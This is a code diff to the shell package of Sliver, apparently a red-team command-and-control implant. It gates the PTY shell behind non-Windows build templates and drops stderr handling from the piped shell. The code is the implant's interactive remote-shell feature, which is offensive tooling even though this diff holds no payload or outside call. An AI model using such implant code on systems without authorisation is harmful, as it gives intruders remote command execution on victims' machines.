@@ -2,17 +2,21 @@ package shell
 
 import (
 	"io"
-	"runtime"
 
 	// {{if .Debug}}
 	"log"
 	// {{end}}
+
 	"os"
 	"os/exec"
 	"sync"
 
 	pb "sliver/protobuf/sliver"
+
+	// {{if ne .GOOS "windows"}}
+	"runtime"
 	"sliver/sliver/shell/pty"
+	// {{end}}
 )
 
 const (
@@ -85,12 +89,13 @@ func Start(command string) error {
 // StartInteractive - Start a shell
 func StartInteractive(command []string, enablePty bool) *Shell {
 
+	// {{if ne .GOOS "windows"}}
 	if enablePty && runtime.GOOS != "windows" {
 		return ptyShell(command)
-	} else {
-		return pipedShell(command)
 	}
+	// {{end}}
 
+	return pipedShell(command)
 }
 
 func pipedShell(command []string) *Shell {
@@ -103,27 +108,9 @@ func pipedShell(command []string) *Shell {
 
 	stdin, _ := cmd.StdinPipe()
 	stdout, _ := cmd.StdoutPipe()
-	stderr, _ := cmd.StderrPipe()
 
 	read := make(chan []byte)
 	write := make(chan []byte)
-
-	go func() {
-		buf := make([]byte, readBufSize)
-		for {
-			n, err := stderr.Read(buf)
-			// {{if .Debug}}
-			log.Printf("[shell] read (stderr)")
-			// {{end}}
-			if err == io.EOF {
-				// {{if .Debug}}
-				log.Printf("[shell] EOF (stderr)")
-				// {{end}}
-				return
-			}
-			read <- buf[:n]
-		}
-	}()
 
 	go func() {
 		buf := make([]byte, readBufSize)
@@ -146,7 +133,6 @@ func pipedShell(command []string) *Shell {
 		defer func() {
 			stdin.Close()
 			stdout.Close()
-			stderr.Close()
 			close(read)
 		}()
 		for incoming := range write {
@@ -166,6 +152,7 @@ func pipedShell(command []string) *Shell {
 	}
 }
 
+// {{if ne .GOOS "windows"}}
 func ptyShell(command []string) *Shell {
 	// {{if .Debug}}
 	log.Printf("[ptmx] %s", command)
@@ -221,6 +208,8 @@ func ptyShell(command []string) *Shell {
 		Write: &write,
 	}
 }
+
+// {{end}}
 
 func exists(path string) bool {
 	_, err := os.Stat(path)
